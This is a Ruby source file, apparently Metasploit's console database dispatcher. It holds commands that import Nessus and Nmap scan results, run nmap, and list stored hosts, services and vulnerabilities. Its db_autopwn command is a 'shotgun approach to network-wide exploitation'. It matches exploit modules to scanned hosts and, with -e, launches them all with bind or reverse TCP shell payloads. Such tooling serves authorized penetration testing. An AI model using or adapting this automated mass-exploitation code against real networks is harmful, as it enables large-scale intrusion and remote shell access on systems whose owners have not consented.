module Msf
module Ui
module Console
module CommandDispatcher
module Db

		require 'rexml/document'
		require 'tempfile'
		
		#
		# Constants
		#

		PWN_SHOW = 2**0
		PWN_XREF = 2**1
		PWN_PORT = 2**2
		PWN_EXPL = 2**3
		PWN_SING = 2**4
			
		#
		# The dispatcher's name.
		#
		def name
			"Database Backend"
		end

		#
		# Returns the hash of commands supported by this dispatcher.
		#
		def commands
			{
				"db_hosts"    => "List all hosts in the database",
				"db_services" => "List all services in the database",
				"db_vulns"    => "List all vulnerabilities in the database",
				"db_add_host" => "Add one or more hosts to the database",
				"db_add_port" => "Add a port to host",
				"db_autopwn"  => "Automatically exploit everything",
				"db_import_nessus_nbe" => "Import a Nessus scan result file (NBE)",
				"db_import_nmap_xml"   => "Import a Nmap scan results file (-oX)",
				"db_nmap" => "Executes nmap and records the output automatically",
			}
		end

		def cmd_db_hosts(*args)
			framework.db.each_host do |host|
				print_status("Host: #{host.address}")
			end
		end

		def cmd_db_services(*args)
			framework.db.each_service do |service|
				print_status("Service: host=#{service.host.address} port=#{service.port} proto=#{service.proto} state=#{service.state} name=#{service.name}")			
			end
		end		
		
		def cmd_db_vulns(*args)
			framework.db.each_vuln do |vuln|
				reflist = vuln.refs.map { |r| r.name }
				puts "Vuln: host=#{vuln.host.address} port=#{vuln.service.port} proto=#{vuln.service.proto} name=#{vuln.name} refs=#{reflist.join(',')}"
			end
		end	
		
		def cmd_db_add_host(*args)
			print_status("Adding #{args.length.to_s} hosts...")
			args.each do |address|
				framework.db.get_host(nil, address)
			end
		end

		def cmd_db_add_port(*args)
			if (not args or args.length < 3)
				print_status("Usage: db_add_port [host] [port] [proto]")
				return
			end

			host = framework.db.get_host(nil, args[0])
			return if not host
			
			service = framework.db.get_service(nil, host, args[2].downcase, args[1].to_i)
			return if not service
			
			print_status("Service: host=#{service.host.address} port=#{service.port} proto=#{service.proto} state=#{service.state}")
		end

		#
		# A shotgun approach to network-wide exploitation
		#
		def cmd_db_autopwn(*args)

			stamp = Time.now.to_f
			vcnt  = 0
			rcnt  = 0
			mode  = 0
			code  = :bind
			
			targ_inc = []
			targ_exc = []
			
			args.push("-h") if args.length == 0
			
			while (arg = args.shift)
				case arg
				when '-t'
					mode |= PWN_SHOW
				when '-x'
					mode |= PWN_XREF
				when '-p'
					mode |= PWN_PORT
				when '-e'
					mode |= PWN_EXPL
				when '-s'
					mode |= PWN_SING					
				when '-r'
					code = :conn
				when '-b'
					code = :bind
				when '-I'
					targ_inc << OptAddressRange.new('TEMPRANGE', [ true, '' ]).normalize(args.shift)
				when '-X'
					targ_exc << OptAddressRange.new('TEMPRANGE', [ true, '' ]).normalize(args.shift)
				when '-h'
					print_status("Usage: db_autopwn [options]")
					print_line("\t-h         Display this help text")
					print_line("\t-t         Show all matching exploit modules")
					print_line("\t-x         Select modules based on vulnerability references")
					print_line("\t-p         Select modules based on open ports")
					print_line("\t-e         Launch exploits against all matched targets")
					print_line("\t-s         Only obtain a single shell per target system (NON-FUNCTIONAL)")
					print_line("\t-r         Use a reverse connect shell")
					print_line("\t-b         Use a bind shell on a random port")
					print_line("\t-I [range] Only exploit hosts inside this range")
					print_line("\t-X [range] Always exclude hosts inside this range")
					
					print_line("")
					return
				end
			end

			matches = {}
			
			[ [framework.exploits, 'exploit' ], [ framework.auxiliary, 'auxiliary' ] ].each do |mtype|			
				# Scan all exploit modules for matching references
				mtype[0].each_module do |n,m|
					e = m.new
					
					#
					# Match based on vulnerability references
					#
					if (mode & PWN_XREF != 0)
						e.references.each do |r|
							rcnt += 1

							ref_name = r.ctx_id + '-' + r.ctx_val
							ref = framework.db.has_ref?(ref_name)
							
							if (ref)
								ref.vulns.each do |vuln|
									vcnt  += 1
									serv  = vuln.service
									xport = serv.port
									xprot = serv.proto
									xhost = serv.host.address
									next if (targ_inc.length > 0 and not range_include?(targ_inc, xhost))
									next if (targ_exc.length > 0 and range_include?(targ_exc, xhost))
									matches[[xport,xprot,xhost,mtype[1]+'/'+n]]=true
								end
							end
						end
					end

					#
					# Match based on ports alone
					#
					if (mode & PWN_PORT != 0)
						rport = e.datastore['RPORT']
						if (rport)
							framework.db.services.each do |serv|
								next if serv.port.to_i != rport.to_i
								xport = serv.port
								xprot = serv.proto
								xhost = serv.host.address
								next if (targ_inc.length > 0 and not range_include?(targ_inc, xhost))
								next if (targ_exc.length > 0 and range_include?(targ_exc, xhost))								
								matches[[xport,xprot,xhost,mtype[1]+'/'+n]]=true
							end
						end
					end					
				end
			end


			if (mode & PWN_SHOW != 0)
				print_status("Analysis completed in #{(Time.now.to_f - stamp).to_s} seconds (#{vcnt.to_s} vulns / #{rcnt.to_s} refs)")
			end
			
			idx = 0
			matches.each_key do |xref|
				idx += 1
				
				begin
					mod = nil

					if ((mod = framework.modules.create(xref[3])) == nil)
						print_status("Failed to initialize #{xref[3]}")
						next
					end

					if (mode & PWN_SHOW != 0)
						print_status("Matched #{xref[3]} against #{xref[2].to_s}:#{mod.datastore['RPORT'].to_s}...")
					end
					
					#
					# The code is just a proof-of-concept and will be expanded in the future
					#
					if (mode & PWN_EXPL != 0)

						mod.datastore['RHOST'] = xref[2]
						mod.datastore['RPORT'] = xref[0].to_s

						if (code == :bind)
							mod.datastore['PAYLOAD'] = 'generic/shell_bind_tcp'
							mod.datastore['LPORT']   = (rand(0x8fff) + 4000).to_s
						end
						
						if (code == :conn)
							mod.datastore['PAYLOAD'] = 'generic/shell_reverse_tcp'
							mod.datastore['LHOST']   = 	Rex::Socket.source_address(xref[2])
							mod.datastore['LPORT']   = 	(rand(0x8fff) + 4000).to_s
							
							if (mod.datastore['LHOST'] == '127.0.0.1')
								print_status("Failed to determine listener address for target #{xref[2]}...")
								next
							end
						end
						
						next if not mod.autofilter()

						print_status("Launching #{xref[3]} (#{idx.to_s}/#{matches.length.to_s}) against #{xref[2].to_s}:#{mod.datastore['RPORT'].to_s}...")

						begin
							case mod.type
							when MODULE_EXPLOIT
								session = mod.exploit_simple(
									'Payload'        => mod.datastore['PAYLOAD'],
									'LocalInput'     => driver.input,
									'LocalOutput'    => driver.output,
									'RunAsJob'       => true)
							when MODULE_AUX
								session = mod.run_simple(
									'LocalInput'     => driver.input,
									'LocalOutput'    => driver.output,
									'RunAsJob'       => true)			
							end
						rescue ::Exception
							print_status(" >> Exception during launch from #{xref[3]}: #{$!.to_s}")
						end
					end
					
				rescue ::Exception
					print_status(" >> Exception from #{xref[3]}: #{$!.to_s}")
				end
			end	

		# EOM
		end

		
		#
		# Import Nessus NBE files
		#
		def cmd_db_import_nessus_nbe(*args)
			if (not (args and args.length == 1))
				print_status("Usage: db_import_nessus_nbe [nessus.nbe]")
				return
			end
			
			if (not File.readable?(args[0])) 
				print_status("Could not read the NBE file")
				return
			end
			
			fd = File.open(args[0], 'r')
			fd.each_line do |line|
				r = line.split('|')
				next if r[0] != 'results'
				addr = r[2]
				nasl = r[4]
				hole = r[5]
				data = r[6]
				refs = {}
				
				m = r[3].match(/^([^\(]+)\((\d+)\/([^\)]+)\)/)
				next if not m
				
				host = framework.db.get_host(nil, addr)
				next if not host
				
				service = framework.db.get_service(nil, host, m[3].downcase, m[2].to_i)
				service.name = m[1]
				service.save
				
				next if not nasl
				
				data.gsub!("\\n", "\n")
				
				
				if (data =~ /^CVE : (.*)$/)
					$1.gsub(/C(VE|AN)\-/, '').split(',').map { |r| r.strip }.each do |r|
						refs[ 'CVE-' + r ] = true
					end
				end

				if (data =~ /^BID : (.*)$/)
					$1.split(',').map { |r| r.strip }.each do |r|
						refs[ 'BID-' + r ] = true
					end
				end

				if (data =~ /^Other references : (.*)$/)
					$1.split(',').map { |r| r.strip }.each do |r|
						ref_id, ref_val = r.split(':')
						ref_val ? refs[ ref_id + '-' + ref_val ] = true : refs[ ref_id ] = true
					end
				end
								
				refs[ 'NSS-' + nasl.to_s ] = true
								
				vuln = framework.db.get_vuln(nil, service, 'NSS-' + nasl.to_s, data)
				
				rids = []
				refs.keys.each do |r|
					rids << framework.db.get_ref(nil, r)
				end
				
				vuln.refs << (rids - vuln.refs)
			end
		end
		
		
		#
		# Import Nmap data from a file
		#
		def cmd_db_import_nmap_xml(*args)
			if (not (args and args.length == 1))
				print_status("Usage: db_import_nmap_xml [nmap.xml]")
				return
			end
			
			if (not File.readable?(args[0])) 
				print_status("Could not read the XML file")
				return
			end
			
			fd = File.open(args[0], 'r')
			data = fd.read
			fd.close
			
			load_nmap_xml(data)
		end

		#
		# Import Nmap data from a file
		#
		def cmd_db_nmap(*args)
			if (args.length == 0)
				print_status("Usage: db_nmap [nmap options]")
				return
			end
			
			fd = Tempfile.new('dbnmap')
			args.push('-oX', fd.path)
			args.unshift('nmap')

			system(*args)			

			data = fd.read
			
			fd.close
			
			load_nmap_xml(data)
		end		
		
		#
		# Process Nmap XML data
		#
		def load_nmap_xml(data)
			doc = REXML::Document.new(data)
			doc.elements.each('/nmaprun/host') do |host|
				addr = host.elements['address'].attributes['addr']
				host.elements['ports'].elements.each('port') do |port|
					prot = port.attributes['protocol']
					pnum = port.attributes['portid']
					
					next if not port.elements['state']
					stat = port.elements['state'].attributes['state']
					
					next if not port.elements['service']
					name = port.elements['service'].attributes['name']
					prod = port.elements['service'].attributes['product']
					xtra = port.elements['service'].attributes['extrainfo']

					next if stat != 'open'
					
					host = framework.db.get_host(nil, addr)
					next if not host
					
					service = framework.db.get_service(nil, host, prot.downcase, pnum.to_i)
					service.name = name
					service.save
				end
			end
		end
		
		#
		# Determine if an IP address is inside a given range
		#
		def range_include?(ranges, addr)

			ranges.each do |sets|
				sets.each do |set|
					rng = set.split('-').map{ |c| Rex::Socket::addr_atoi(c) }
					tst = Rex::Socket::addr_atoi(addr)
					if (tst >= rng[0] and tst <= rng[1])
						return true
					end
				end
			end
			
			false
		end
end
end
end
end
end
